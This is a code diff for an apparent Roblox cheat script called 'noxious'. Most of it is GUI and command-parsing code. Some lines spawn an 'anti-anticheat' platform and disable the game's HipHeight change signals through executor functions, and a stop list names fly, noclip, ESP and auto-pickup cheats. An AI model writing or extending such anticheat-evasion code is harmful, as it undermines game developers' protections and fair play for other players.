+	noxious["alert sound"].SoundId = "rbxassetid://8426701399"
+	noxious["alert sound"].Parent = workspace
+	noxious["alert sound"].Volume = 1
+
+	task.spawn(function() noxious["alert sound"]:Play() end)
+
+	noxious["halt mainframe"] = Instance.new("Frame")
+	noxious["halt mainframe"].Parent = noxious["screen gui"]
+	noxious["halt mainframe"].Size = UDim2.new(0, 280, 0, 170)
+	noxious["halt mainframe"].BackgroundTransparency = 0.6
+	noxious["halt mainframe"].BackgroundColor3 = noxious["default black color"]
+	noxious["halt mainframe"].BorderColor3 = noxious["default halt mainframe white color"]
+	noxious["halt mainframe"].ZIndex = 998
+
+	noxious["halt text"] = Instance.new("TextLabel")
+	noxious["halt text"].Parent = noxious["screen gui"]
+	noxious["halt text"].Size = UDim2.new(0, 240, 0, 170)
+	noxious["halt text"].BackgroundTransparency = 1
+	noxious["halt text"].BackgroundColor3 = noxious["default black color"]
+	noxious["halt text"].BorderColor3 = noxious["default halt mainframe white color"]
+	noxious["halt text"].TextColor3 = noxious["default halt mainframe white color"]
+	noxious["halt text"].TextSize = 17
+	noxious["halt text"].TextScaled = false
+	noxious["halt text"].TextWrapped = true
+	noxious["halt text"].Text = text .. "\n\n"
+	noxious["halt text"].TextXAlignment = Enum.TextXAlignment.Center
+	noxious["halt text"].TextYAlignment = Enum.TextYAlignment.Center
+	noxious["halt text"].Font = Enum.Font.Nunito
+	noxious["halt text"].ZIndex = 999
+
+	local textpadding = Instance.new("UIPadding")
+	textpadding.PaddingBottom = UDim.new(0, 16)
+	textpadding.Parent = noxious["halt text"]
+
+	noxious["halt mainframe line"] = Instance.new("Frame")
+	noxious["halt mainframe line"].Size = UDim2.new(0, 1, 0, 150)
+	noxious["halt mainframe line"].Position = UDim2.new(0, -1, 0, 0)
+	noxious["halt mainframe line"].BackgroundColor3 = noxious["default halt mainframe white color"]
+	noxious["halt mainframe line"].BorderSizePixel = 0
+	noxious["halt mainframe line"].BackgroundTransparency = 0
+	noxious["halt mainframe line"].Parent = noxious["halt mainframe"]
+	noxious["halt mainframe line"].Visible = true
+	noxious["halt mainframe line"].ZIndex = 1000
+
+	noxious["halt mainframe line 2"] = Instance.new("Frame")
+	noxious["halt mainframe line 2"].Size = UDim2.new(0, 1, 0, 150)
+	noxious["halt mainframe line 2"].Position = UDim2.new(0, 280, 0, 0)
+	noxious["halt mainframe line 2"].BackgroundColor3 = noxious["default halt mainframe white color"]
+	noxious["halt mainframe line 2"].BorderSizePixel = 0
+	noxious["halt mainframe line 2"].BackgroundTransparency = 0
+	noxious["halt mainframe line 2"].Parent =	noxious["halt mainframe"]
+	noxious["halt mainframe line 2"].Visible = true
+	noxious["halt mainframe line 2"].ZIndex = 1000
+
+	noxious["halt mainframe shadow"] = Instance.new("ImageLabel")
+	noxious["halt mainframe shadow"].Name = "Shadow"
+	noxious["halt mainframe shadow"].Size = UDim2.new(0, 292, 0, 204)
+	noxious["halt mainframe shadow"].Position = UDim2.new(0, -6, 0, -27)
+	noxious["halt mainframe shadow"].BackgroundTransparency = 1
+	noxious["halt mainframe shadow"].Image = "rbxassetid://1316045217"
+	noxious["halt mainframe shadow"].ImageColor3 = Color3.new(0, 0, 0)
+	noxious["halt mainframe shadow"].ImageTransparency = 0.3
+	noxious["halt mainframe shadow"].ScaleType = Enum.ScaleType.Slice
+	noxious["halt mainframe shadow"].SliceCenter = Rect.new(10, 10, 90, 90)
+	noxious["halt mainframe shadow"].ZIndex = 998
+	noxious["halt mainframe shadow"].Parent = noxious["halt mainframe"]
+
+	noxious["halt top frame"] = Instance.new("TextLabel")
+	noxious["halt top frame"].Parent = noxious["halt mainframe"]
+	noxious["halt top frame"].Size = UDim2.new(0, 280, 0, 30)
+	noxious["halt top frame"].Position = UDim2.new(0, 0, 0, -20)
+	noxious["halt top frame"].BackgroundTransparency = 0
+	noxious["halt top frame"].BackgroundColor3 = noxious["default black color"]
+	noxious["halt top frame"].BorderColor3 = noxious["default halt mainframe white color"]
+	noxious["halt top frame"].TextColor3 = noxious["default halt mainframe white color"]
+	noxious["halt top frame"].TextSize = 20
+	noxious["halt top frame"].TextScaled = false
+	noxious["halt top frame"].Text = title
+	noxious["halt top frame"].TextXAlignment = Enum.TextXAlignment.Center
+	noxious["halt top frame"].TextYAlignment = Enum.TextYAlignment.Center
+	noxious["halt top frame"].Font = Enum.Font.Nunito
+	noxious["halt top frame"].ZIndex = 9992
+
+	noxious["halt bottom frame"] = Instance.new("TextLabel")
+	noxious["halt bottom frame"].Parent = noxious["halt mainframe"]
+	noxious["halt bottom frame"].Size = UDim2.new(0, 280, 0, 30)
+	noxious["halt bottom frame"].Position = UDim2.new(0, 0, 0, 140)
+	noxious["halt bottom frame"].BackgroundTransparency = 0
+	noxious["halt bottom frame"].BackgroundColor3 = noxious["default black color"]
+	noxious["halt bottom frame"].BorderColor3 = noxious["default halt mainframe white color"]
+	noxious["halt bottom frame"].TextColor3 = noxious["default halt mainframe white color"]
+	noxious["halt bottom frame"].TextSize = 20
+	noxious["halt bottom frame"].TextScaled = false
+	noxious["halt bottom frame"].Text = ""
+	noxious["halt bottom frame"].TextXAlignment = Enum.TextXAlignment.Center
+	noxious["halt bottom frame"].TextYAlignment = Enum.TextYAlignment.Center
+	noxious["halt bottom frame"].Font = Enum.Font.Nunito
+	noxious["halt bottom frame"].ZIndex = 9992
+
+	local function centerhaltmainframe()
+		local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
+		local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y
+		local frameWidth = 280
+		local frameHeight = 140
+		local centerX = (screenWidth - frameWidth) / 2
+		local centerY = (screenHeight - frameHeight) / 2 - 58
+		local targetPosition = UDim2.new(0, centerX, 0, centerY)
+		local tweenInfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0)
+		local tween = noxious["tween service"]:Create(noxious["halt mainframe"], tweenInfo, {Position = targetPosition})
+		tween:Play()
+	end
+	centerhaltmainframe()
+
+	local function centerhalttext()
+		local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
+		local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y
+		local frameWidth = 240
+		local frameHeight = 140
+		local centerX = (screenWidth - frameWidth) / 2
+		local centerY = (screenHeight - frameHeight) / 2 - 58
+		local targetPosition = UDim2.new(0, centerX, 0, centerY)
+		local tweenInfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, false, 0)
+		local tween = noxious["tween service"]:Create(noxious["halt text"], tweenInfo, {Position = targetPosition})
+		tween:Play()
+	end
+	centerhalttext()
+
+	noxious["yes button"] = Instance.new("TextButton")
+	noxious["yes button"].Parent = noxious["halt mainframe"]
+	noxious["yes button"].Size = UDim2.new(0, 128, 0, 27)
+	if lonebutton then noxious["yes button"].Size = UDim2.new(0, 266, 0, 27) end
+	noxious["yes button"].Position = UDim2.new(0, 7, 0, 104)
+	noxious["yes button"].BackgroundTransparency = 0
+	noxious["yes button"].BackgroundColor3 = noxious["default black color"]
+	noxious["yes button"].BorderColor3 = noxious["default halt mainframe white color"]
+	noxious["yes button"].TextColor3 = noxious["default halt mainframe white color"]
+	noxious["yes button"].TextSize = 17
+	noxious["yes button"].TextScaled = false
+	noxious["yes button"].Text = button1
+	noxious["yes button"].TextXAlignment = Enum.TextXAlignment.Center
+	noxious["yes button"].TextYAlignment = Enum.TextYAlignment.Center
+	noxious["yes button"].Font = Enum.Font.Nunito
+	noxious["yes button"].ZIndex = 9992
+
+	noxious["yes button ui corner"] = Instance.new("UICorner")
+	noxious["yes button ui corner"].CornerRadius = UDim.new(0.3, 0)
+	noxious["yes button ui corner"].Parent = noxious["yes button"]
+
+	noxious["yes button border"] = Instance.new("Frame")
+	noxious["yes button border"].Parent = noxious["yes button"]
+	noxious["yes button border"].Size = UDim2.new(0, 130, 0, 29)
+	if lonebutton then noxious["yes button border"].Size = UDim2.new(0, 268, 0, 29) end
+	noxious["yes button border"].Position = UDim2.new(0, -1, 0, -1)
+	noxious["yes button border"].BackgroundTransparency = 0
+	noxious["yes button border"].BackgroundColor3 = noxious["default halt mainframe white color"]
+	noxious["yes button border"].BorderSizePixel = 0
+	noxious["yes button border"].BorderColor3 = noxious["default halt mainframe white color"]
+	noxious["yes button border"].ZIndex = 9991
+
+	noxious["yes button ui corner"] = Instance.new("UICorner")
+	noxious["yes button ui corner"].CornerRadius = UDim.new(0.3, 0)
+	noxious["yes button ui corner"].Parent = noxious["yes button border"]
+
+	noxious["yes button"].MouseButton1Click:Connect(function()
+		playclicksound()
+		if noxious["halt mainframe"] then
+			noxious["halt mainframe"]:Destroy()
+			noxious["halt text"]:Destroy()
+		end
+		if typeof(func) == "function" then
+			func("yes")
+		end
+	end)
+
+	noxious["no button"] = Instance.new("TextButton")
+	if lonebutton then noxious["no button"].Visible = false end
+	noxious["no button"].Parent = noxious["halt mainframe"]
+	noxious["no button"].Size = UDim2.new(0, 128, 0, 27)
+	noxious["no button"].Position = UDim2.new(0, 144, 0, 104)
+	noxious["no button"].BackgroundTransparency = 0
+	noxious["no button"].BackgroundColor3 = noxious["default black color"]
+	noxious["no button"].BorderColor3 = noxious["default halt mainframe white color"]
+	noxious["no button"].TextColor3 = noxious["default halt mainframe white color"]
+	noxious["no button"].TextSize = 17
+	noxious["no button"].TextScaled = false
+	if not lonebutton then noxious["no button"].Text = button2 end
+	noxious["no button"].TextXAlignment = Enum.TextXAlignment.Center
+	noxious["no button"].TextYAlignment = Enum.TextYAlignment.Center
+	noxious["no button"].Font = Enum.Font.Nunito
+	noxious["no button"].ZIndex = 9992
+
+	noxious["no button ui corner"] = Instance.new("UICorner")
+	noxious["no button ui corner"].CornerRadius = UDim.new(0.3, 0)
+	noxious["no button ui corner"].Parent = noxious["no button"]
+
+	noxious["no button border"] = Instance.new("Frame")
+	noxious["no button border"].Parent = noxious["no button"]
+	noxious["no button border"].Size = UDim2.new(0, 130, 0, 29)
+	noxious["no button border"].Position = UDim2.new(0, -1, 0, -1)
+	noxious["no button border"].BackgroundTransparency = 0
+	noxious["no button border"].BackgroundColor3 = noxious["default halt mainframe white color"]
+	noxious["no button border"].BorderSizePixel = 0
+	noxious["no button border"].BorderColor3 = noxious["default halt mainframe white color"]
+	noxious["no button border"].ZIndex = 9991
+
+	noxious["no button ui corner"] = Instance.new("UICorner")
+	noxious["no button ui corner"].CornerRadius = UDim.new(0.3, 0)
+	noxious["no button ui corner"].Parent = noxious["no button border"]
+
+	noxious["no button"].MouseButton1Click:Connect(function()
+		playclicksound()
+		if noxious["halt mainframe"] then
+			noxious["halt mainframe"]:Destroy()
+			noxious["halt text"]:Destroy()
+		end
+		if typeof(func) == "function" then
+			func("no")
+		end
+	end)
+
+	if iserror then
+		task.spawn(function()
+			local function tweenHaltFrameToWhite()
+				if not noxious["halt mainframe"] then return end
+
+				local tweenInfo = TweenInfo.new(
+					2,
+					Enum.EasingStyle.Linear,
+					Enum.EasingDirection.Out,
+					0,
+					false,
+					0
+				)
+
+				local elementsToTween = {
+					{object = noxious["halt mainframe"], property = "BorderColor3"},
+					{object = noxious["halt text"], property = "TextColor3"},
+					{object = noxious["halt mainframe line"], property = "BackgroundColor3"},
+					{object = noxious["halt mainframe line 2"], property = "BackgroundColor3"},
+					{object = noxious["halt top frame"], property = "TextColor3"},
+					{object = noxious["halt top frame"], property = "BorderColor3"},
+					{object = noxious["halt bottom frame"], property = "TextColor3"},
+					{object = noxious["halt bottom frame"], property = "BorderColor3"},
+					{object = noxious["yes button"], property = "BorderColor3"},
+					{object = noxious["yes button"], property = "TextColor3"},
+					{object = noxious["yes button border"], property = "BackgroundColor3"},
+					{object = noxious["no button"], property = "BorderColor3"},
+					{object = noxious["no button border"], property = "BackgroundColor3"},
+					{object = noxious["no button"], property = "TextColor3"},
+				}
+
+				for _, element in pairs(elementsToTween) do
+					if element.object then
+						local tween = noxious["tween service"]:Create(
+							element.object,
+							tweenInfo,
+							{[element.property] = noxious["default white color"]}
+						)
+						tween:Play()
+					end
+				end
+			end
+			tweenHaltFrameToWhite()
+		end)
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function closeallnotificationswithkey(input, gameProcessedEvent)
+	if gameProcessedEvent then
+		return
+	end
+
+	if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.X then
+		closeallnotifs()
+	end
+end
+
+noxious["user input service"].InputBegan:Connect(closeallnotificationswithkey)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+task.spawn(intro)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+task.spawn(function()
+	if game.PlaceId == noxious["dandy's world run"] then
+		noxious["anti anticheat platform"] = Instance.new("Part")
+		noxious["anti anticheat platform"].Size = Vector3.new(2048, 1, 2048)
+		noxious["anti anticheat platform"].Position = Vector3.new(0, 135, 0)
+		noxious["anti anticheat platform"].Anchored = true
+		noxious["anti anticheat platform"].Name = "NoxiousAntiAnticheatPlatform"
+		noxious["anti anticheat platform"].Material = Enum.Material.Neon
+		noxious["anti anticheat platform"].Color = Color3.new(0, 0, 0)
+		noxious["anti anticheat platform"].Parent = game.Workspace
+	end
+end)
+
+task.spawn(function()
+	if not noxious["in studio"] then
+		for i, v in getconnections(noxious["humanoid"]:GetPropertyChangedSignal("HipHeight")) do
+			v:Disable()
+		end;
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local commands = {}
+local prefix = "."
+local prefixreq = true
+
+function addcommand(name, shortname, func)
+	commands[string.lower(name)] = func
+	if shortname and shortname ~= "" then
+		commands[string.lower(shortname)] = func
+	end
+end
+
+function changeprefix(newprefix)
+	if newprefix and newprefix ~= "" then
+		prefix = newprefix
+	end
+end
+
+function parsecmds(input)
+	local cmdgroups = {}
+	local currentcmd = {}
+
+	local words = {}
+	for word in string.gmatch(input, "[^%s]+") do
+		table.insert(words, word)
+	end
+
+	for i, word in ipairs(words) do
+		if word:sub(1, #prefix) == prefix then
+			if #currentcmd > 0 then
+				table.insert(cmdgroups, currentcmd)
+			end
+			currentcmd = {word:sub(#prefix + 1)}
+		elseif #currentcmd == 0 then
+			currentcmd = {word}
+		else
+			table.insert(currentcmd, word)
+		end
+	end
+
+	if #currentcmd > 0 then
+		table.insert(cmdgroups, currentcmd)
+	end
+
+	return cmdgroups
+end
+
+function execcmd(input, isRetry)
+	local cmdgroups = parsecmds(input)
+	local anyValid = false
+	local anyInvalid = false
+
+	for _, cmd in ipairs(cmdgroups) do
+		local cmdname = string.lower(table.remove(cmd, 1))
+		if commands[cmdname] then
+			commands[cmdname](table.unpack(cmd))
+			anyValid = true
+		else
+			anyInvalid = true
+		end
+	end
+
+	return anyValid
+end
+
+function handle(command, clr)
+	if command == "" then
+		notify("Unknown command or invalid arguments.", 5, "error")
+		return
+	end
+
+	if clr then
+		noxious["command bar"].Text = ""
+	end
+
+	local success = execcmd(command, false)
+
+	if not success then
+		local words = {}
+		for word in string.gmatch(command, "[^%s]+") do
+			table.insert(words, word)
+		end
+
+		if #words > 0 then
+			words[1] = prefix .. words[1]
+			local retrySuccess = execcmd(table.concat(words, " "), true)
+
+			if not retrySuccess then
+				notify("Unknown command or invalid arguments.", 5, "error")
+			end
+		else
+			notify("Unknown command or invalid arguments.", 5, "error")
+		end
+	end
+end
+
+noxious["execute button"].MouseButton1Click:Connect(function()
+	playclicksound()
+	local text = noxious["command bar"].Text
+	canusekeybind = true
+
+	if text == "" then
+		task.spawn(function() notify("Unknown command or invalid arguments.", 5, "error") end)
+		if autosearchcommand then
+			if previousListName == nil then
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+				noxious["current displayed list"] = "All Commands"
+				dispcmds(noxious["command lists"]["All Commands"])
+			elseif noxious["command lists"][previousListName] then
+				dispcmds(noxious["command lists"][previousListName], previousListName)
+				noxious["current displayed list"] = previousListName
+
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == previousListName then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+			else
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+				noxious["current displayed list"] = "All Commands"
+				dispcmds(noxious["command lists"]["All Commands"])
+			end
+		end
+	else
+		handle(text, false)
+		if not autosearchcommand then return end
+		dispcmds(noxious["command lists"]["All Commands"])
+		noxious["current displayed list"] = "All Commands"
+
+		for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+			if button:IsA("TextButton") then
+				if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+					updateButtonText(button)
+					break
+				end
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function updateCharacterReferences(newCharacter)
+	noxious["humanoid"] = newCharacter
+	noxious["humanoid"]:WaitForChild"Humanoid"	
+end
+
+noxious["local player"].CharacterAdded:Connect(updateCharacterReferences)
+
+function checktoon(toon)
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait() character:WaitForChild("Head")		
+	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild("InGamePlayers")
+
+	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild("ToonName")
+
+	local characterName
+	if not toonName then
+		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild("Config")			
+		local charNameValue = config and config:FindFirstChild("CharacterName")			
+		if charNameValue and charNameValue:IsA("StringValue") then
+			characterName = charNameValue.Value
+		end
+	end
+
+	if (not toonName or toonName.Value ~= toon) and (not characterName or characterName ~= toon) then
+		notify("You need to be ".. toon .." to enable this.", 5, "error")
+		return false
+	end
+
+	return true
+end
+
+function istoon(toon)
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait() character:WaitForChild("Head")		
+	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild("InGamePlayers")
+
+	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild("ToonName")
+
+	local characterName
+	if not toonName then
+		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild("Config")			
+		local charNameValue = config and config:FindFirstChild("CharacterName")			
+		if charNameValue and charNameValue:IsA("StringValue") then
+			characterName = charNameValue.Value
+		end
+	end
+
+	if (not toonName or toonName.Value ~= toon) and (not characterName or characterName ~= toon) then
+		return false
+	end
+
+	return true
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("reloadnoxious", "reloadnxs", function()
+	reloadnoxiouscommand()
+end)
+
+addcommand("repositionnoxious", "reposnxs", function()
+	centermainframe(false)
+end)
+
+addcommand("hidenoxious", "hidenxs", function()
+	togglevisibility()
+end)
+
+local destroycallcount = 0
+
+addcommand("destroynoxious", "destroynxs", function()
+	destroycallcount += 1
+
+	if destroycallcount == 1 then
+		notify("Click button again to confirm.", 5)
+	end
+
+	if destroycallcount == 2 then
+		task.spawn(function()
+			noxious["screen gui"]:Destroy()
+		end)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+lineThickness = 6
+lineLength = 40
+gapSize = 17
+fadeOutTime = 0.3
+activeCrosshairs = {}
+crosshairsEnabled = false
+
+function createCrosshair(position)
+	if not crosshairsEnabled then
+		return
+	end
+
+	local crosshairFrame = Instance.new("Frame")		
+	crosshairFrame.Size = UDim2.new(0, lineLength * 2 + gapSize, 0, lineLength * 2 + gapSize)
+	crosshairFrame.Position = UDim2.new(0, position.X, 0, position.Y)
+	crosshairFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+	crosshairFrame.BackgroundTransparency = 1
+	crosshairFrame.Parent = noxious["screen gui"]
+	crosshairFrame.ZIndex = math.huge
+
+	local function createLine(size, pos)
+		local line = Instance.new("Frame")			
+		line.Size = size
+		line.Position = pos
+		line.BackgroundColor3 = Color3.new(1, 1, 1)
+		line.BorderSizePixel = 0
+		line.AnchorPoint = Vector2.new(0.5, 0.5)
+		line.Parent = crosshairFrame
+		line.ZIndex = 999
+		return line
+	end
+
+	createLine(UDim2.new(0, lineThickness, 0, lineLength), UDim2.new(0.5, 0, 0, -gapSize / 2))
+	createLine(UDim2.new(0, lineThickness, 0, lineLength), UDim2.new(0.5, 0, 1, gapSize / 2))
+	createLine(UDim2.new(0, lineLength, 0, lineThickness), UDim2.new(0, -gapSize / 2, 0.5, 0))
+	createLine(UDim2.new(0, lineLength, 0, lineThickness), UDim2.new(1, gapSize / 2, 0.5, 0))
+
+	local function spinCrosshair()
+		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
+		local tween = noxious["tween service"]:Create(crosshairFrame, tweenInfo, {Rotation = 360})
+		tween:Play()
+	end
+
+	spinCrosshair()
+
+	return crosshairFrame
+end
+
+function updateCrosshair(crosshairFrame, position)
+	crosshairFrame.Position = UDim2.new(0, position.X, 0, position.Y)
+end
+
+function fadeOutCrosshair(crosshairFrame)
+	local tweenInfo = TweenInfo.new(fadeOutTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+
+
+	for _, line in pairs(crosshairFrame:GetChildren()) do
+		local tween = noxious["tween service"]:Create(line, tweenInfo, {BackgroundTransparency = 1})
+		tween:Play()
+	end
+
+	task.delay(
+		fadeOutTime,
+		function()
+			crosshairFrame:Destroy()
+		end
+	)
+end
+
+noxious["user input service"].InputBegan:Connect(
+	function(input, processed)
+		if
+			(input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1) and
+			crosshairsEnabled
+		then
+			local position = input.Position
+			local crosshair = createCrosshair(position)
+			if crosshair then
+				activeCrosshairs[input] = crosshair
+
+				input:GetPropertyChangedSignal"Position":Connect(
+					function()
+						if activeCrosshairs[input] then
+							updateCrosshair(crosshair, input.Position)
+						end
+					end
+				)
+
+				input:GetPropertyChangedSignal"UserInputState":Connect(
+					function()
+						if input.UserInputState == Enum.UserInputState.End then
+							fadeOutCrosshair(crosshair)
+							activeCrosshairs[input] = nil
+						end
+					end
+				)
+			end
+		end
+	end
+)
+
+addcommand("enablemobiletapindicators", "emti", function()
+	crosshairsEnabled = true
+end)
+
+addcommand("disablemobiletapindicators", "dmti", function()
+	crosshairsEnabled = false
+	for _, crosshair in pairs(activeCrosshairs) do
+		fadeOutCrosshair(crosshair)
+	end
+	activeCrosshairs = {}
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function stoprunningconnections()
+	task.spawn(function() execcmd("unview") end)
+	task.spawn(function() execcmd("untpwalk") end)
+	task.spawn(function() execcmd("unpspeed") end)
+	task.spawn(function() execcmd("drosrpn") end)
+	task.spawn(function() execcmd("disableloopmaxspeed") end)
+	task.spawn(function() execcmd("dgrpn") end)
+	task.spawn(function() execcmd("disablespameggsonabilityaudio") end)
+	task.spawn(function() execcmd("dtcg") end)
+	task.spawn(function() execcmd("dricg") end)
+	task.spawn(function() execcmd("dtn") end)
+	task.spawn(function() execcmd("drin") end)
+	task.spawn(function() execcmd("ddpn") end)
+	task.spawn(function() execcmd("dinmd") end)
+	task.spawn(function() execcmd("hdg") end)
+	task.spawn(function() execcmd("dgfb") end)
+	task.spawn(function() execcmd("dlhcg") end)
+	task.spawn(function() execcmd("ddpcg") end)
+	task.spawn(function() execcmd("unspin") end)
+	task.spawn(function() execcmd("datpt7pe") end)
+	task.spawn(function() execcmd("rec") end)
+	task.spawn(function() execcmd("dia") end)
+	task.spawn(function() execcmd("hot") end)
+	task.spawn(function() execcmd("dlrs") end)
+	task.spawn(function() execcmd("daui") end)
+	task.spawn(function() execcmd("unfly") end)
+	task.spawn(function() execcmd("uncffly") end)
+	task.spawn(function() execcmd("daua") end)
+	task.spawn(function() execcmd("djump") end)
+	task.spawn(function() execcmd("dmti") end)
+	task.spawn(function() execcmd("dgnt") end)
+	task.spawn(function() execcmd("clip") end)
+	task.spawn(function() execcmd("dac") end)
+	task.spawn(function() execcmd("hap") end)
+	task.spawn(function() execcmd("datpte") end)
+	task.spawn(function() execcmd("slt") end)
+	task.spawn(function() execcmd("sespt") end)
+	task.spawn(function() execcmd("sesph") end)
+	task.spawn(function() execcmd("daesp") end)
+	task.spawn(function() execcmd("dfb") end)
+	task.spawn(function() execcmd("dafb") end)
+	task.spawn(function() execcmd("unhead") end)
+	task.spawn(function() execcmd("unhsit") end)
+	task.spawn(function() execcmd("unhsit2") end)
+	task.spawn(function() execcmd("unhjump") end)
+	task.spawn(function() execcmd("unbbang") end)
+	task.spawn(function() execcmd("dwf") end)
+	task.spawn(function() hideRadius("KillRadius") end)
+	task.spawn(function() hideRadius("InstantRadius") end)
+	task.spawn(function() hideRadius("VisionRadius") end)
+	task.spawn(function() hideRadius("HearingRadius") end)
+	task.spawn(function() execcmd("disablebassiemacro") end)
+	task.spawn(function() execcmd("unbang") end)
+	task.spawn(function() disableAnimation() end)
+	task.spawn(function() execcmd("undance") end)
+	task.spawn(function() execcmd("sdl") end)
+	task.spawn(function() execcmd("hph") end)
+	task.spawn(function() execcmd("untpose") end)
+	task.spawn(function() execcmd("unbodiless") end)
+	task.spawn(function() execcmd("unheadless") end)
+	task.spawn(function() execcmd("unarmless") end)
+	task.spawn(function() execcmd("unlegless") end)
+	task.spawn(function() execcmd("unkorblox") end)
+	task.spawn(function() execcmd("dlfui all") end)
+	task.spawn(function() disableAllAnimationLoops() end)
+	task.spawn(function() execcmd("dga") end)
+	task.spawn(function() execcmd("disableautopickupallitems") end)
+	task.spawn(function() execcmd("disableautopickupallresearchcapsules") end)
+	task.spawn(function() execcmd("disableautopickupalltapes") end)
+	task.spawn(function() execcmd("disableautopickupallheals") end)
+	task.spawn(function() execcmd("disableautopickupallextractionitems") end)
+	task.spawn(function() execcmd("disableautoencountertwisteds") end)
+	task.spawn(function() execcmd("disableautoencountertwisteds") end)
+	task.spawn(function() execcmd("disableautopickupallresearchcapsules") end)
+	task.spawn(function() execcmd("disableautopickupalltapes") end)
+	task.spawn(function() execcmd("disableautopickupallheals") end)
+	task.spawn(function() execcmd("disableautopickupallextractionitems") end)
+	task.spawn(function() execcmd("disablepanicautopickupallitems") end)
+	task.spawn(function() execcmd("disablepanicautopickupallresearchcapsules") end)
+	task.spawn(function() execcmd("disablepanicautopickupalltapes") end)
+	task.spawn(function() execcmd("disablepanicautopickupallheals") end)
+	task.spawn(function() execcmd("disablepanicautopickupallextractionitems") end)
+	task.spawn(function() execcmd("disablepanicautoencountertwisteds") end)
+	task.spawn(function() execcmd("disablepanicautopickupallitems") end)
+	task.spawn(function() execcmd("disablepanicautopickupallresearchcapsules") end)
+	task.spawn(function() execcmd("disablepanicautopickupalltapes") end)
+	task.spawn(function() execcmd("disablepanicautopickupallheals") end)
+	task.spawn(function() execcmd("disablepanicautopickupallextractionitems") end)
+	task.spawn(function() execcmd("disablepanicautoencountertwisteds") end)
+	task.spawn(function() execcmd("disablecosmohealnearby") end)
+	task.spawn(function() execcmd("disablesprouthealnearby") end)
+	task.spawn(function() execcmd("disableautouseability") end)
+	task.spawn(function() execcmd("disableautovoterandomcard") end)
+	task.spawn(function() execcmd("disableautovotehealcard") end)
+	task.spawn(function() execcmd("disableautovoteblindgrabcard") end)
+	task.spawn(function() execcmd("disableautovotetapescard") end)
+	task.spawn(function() execcmd("disableautovotefrugalcard") end)
+	task.spawn(function() execcmd("disableautovoteelevatortimecard") end)
+	task.spawn(function() execcmd("disableautovotemaxstaminacard") end)
+	task.spawn(function() execcmd("disableautovotesparkplugcard") end)
+	task.spawn(function() execcmd("disableautovoteelectriciancard") end)
+	task.spawn(function() execcmd("disableautovotesuppressioncard") end)
+	task.spawn(function() execcmd("disableautovotetechsavvycard") end)
+	task.spawn(function() execcmd("disableautovoteabilitycard") end)
+end
+
+addcommand("stoprunningconnections", "src", function()
+	stoprunningconnections()
+end)
+
+addcommand("scriptforcestoprunningconnections", "sfsrc", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end   
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+	if channel then
+		channel:SendAsync("/e stopconnections")        
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("openconsole", "console", function()
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+	if channel then
+		channel:SendAsync("/console")        
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("hidedeveloperlabel", "hdl", function()
+	for _, player in ipairs(noxious["players"]:GetPlayers()) do
+		local character = player.Character
+		if character then
+			local HRP = character:FindFirstChild("HumanoidRootPart")				
+			if HRP then
+				local billboardGui = HRP:FindFirstChild("UserImageBillboard")			
+				if billboardGui then
+					billboardGui.Size = UDim2.new(0, 0, 0, 0)
+				end
+			end
+		end
+	end
+end)
+
+addcommand("showdeveloperlabel", "sdl", function()
+	for _, player in ipairs(noxious["players"]:GetPlayers()) do
+		local character = player.Character
+		if character then
+			local HRP = character:FindFirstChild("HumanoidRootPart")				
+			if HRP then
+				local billboardGui = HRP:FindFirstChild("UserImageBillboard")					
+				if billboardGui then
+					billboardGui.Size = UDim2.new(0, 0, 0, 0)
+				end
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("executeallfavoritedcommands", "eafc", function()
